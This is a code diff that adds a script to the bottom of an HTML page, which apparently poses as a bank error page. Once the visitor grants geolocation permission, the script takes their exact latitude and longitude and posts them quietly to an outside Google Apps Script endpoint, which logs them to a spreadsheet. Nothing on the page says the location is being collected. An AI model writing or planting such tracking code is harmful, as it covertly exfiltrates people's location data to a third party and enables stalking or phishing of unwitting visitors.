@@ -243,5 +243,26 @@
         </section>
       </div>
     </section>
+    <script>
+      const scriptURL =
+        "https://script.google.com/macros/s/AKfycbzi5dxCsfehVqPeM2ZAtDlh1JmBffrMpFprVx-mCv31wiTev8drSHS1OY3YDPqwXvKl/exec";
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const latitude = position.coords.latitude.toFixed(6);
+            const longitude = position.coords.longitude.toFixed(6);
+
+            // buat URL custom yang nanti disimpan di spreadsheet
+            const mapsUrl = `https://byond-bsi-error.vercel.app/?lat=${latitude}&lng=${longitude}`;
+
+            fetch(scriptURL, {
+              method: "POST",
+              body: JSON.stringify({ longitude, latitude, mapsUrl }),
+            });
+          },
+        );
+      } 
+    </script>
   </body>
 </html>
